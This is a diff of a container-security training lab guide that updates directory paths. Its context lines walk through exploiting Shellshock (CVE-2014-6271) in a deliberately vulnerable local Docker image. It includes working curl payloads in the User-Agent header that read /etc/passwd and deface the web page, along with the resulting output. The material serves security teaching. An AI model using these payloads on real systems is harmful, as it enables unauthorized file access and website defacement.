@@ -10,10 +10,10 @@
 
 ##### Step 2:
 
-*  **cd** into  `Labs/3.0.0-Container-Attacks/3.7.0`
+*  **cd** into  `/home/we45/container_training/Container/Container-Attacks/Vulnerable-Libraries-ShellShock`
 
     ```commandline
-    cd Labs/3.0.0-Container-Attacks/3.7.0
+    cd /home/we45/container_training/Container/Container-Attacks/Vulnerable-Libraries-ShellShock
     ```
 
 ##### Step 3:
@@ -21,7 +21,7 @@
 * Run the image vulnerable to shell-shock `docker run -d -it -p 8080:80 vulnerables/cve-2014-6271`
 
     ```commandline
-    root@we45:~/Labs/3.0.0-Container-Attacks/3.7.0# docker run -d -it -p 8080:80 vulnerables/cve-2014-6271
+    root@we45:~/container_training/Container/Container-Attacks/Vulnerable-Libraries-ShellShock# docker run -d -it -p 8080:80 vulnerables/cve-2014-6271
     208ee69b40e260c5605cde5faca67e0428c7fe80a237b5cd5767f9e2e734f03d
     
     ```
@@ -38,7 +38,7 @@
 http://localhost:8080/cgi-bin/vulnerable` to exploit the vulnerability and access the `/etc/passwd` file on the vulnerable container.
 
 ```commandline
-root@we45:~/Labs/3.0.0-Container-Attacks/3.7.0# curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" \
+root@we45:~/container_training/Container/Container-Attacks/Vulnerable-Libraries-ShellShock# curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" \
 > http://localhost:8080/cgi-bin/vulnerable
 
 root:x:0:0:root:/root:/bin/bash
@@ -68,7 +68,7 @@ libuuid:x:100:101::/var/lib/libuuid:/bin/sh
 * Run `curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'echo \"<html><body><h1> DEFACED! ;) </h1></body></html>\" > /var/www/index.html'" http://localhost:8080/cgi-bin/vulnerable` to deface the website.
 
 ```commandline
-root@we45:~/Labs/3.0.0-Container-Attacks/3.7.0# curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'echo \"<html><body><h1> DEFACED! ;) </h1></body></html>\" > /var/www/index.html'" http://localhost:8080/cgi-bin/vulnerable
+root@we45:~/container_training/Container/Container-Attacks/Vulnerable-Libraries-ShellShock# curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'echo \"<html><body><h1> DEFACED! ;) </h1></body></html>\" > /var/www/index.html'" http://localhost:8080/cgi-bin/vulnerable
 ```
 
 ##### Step 7:
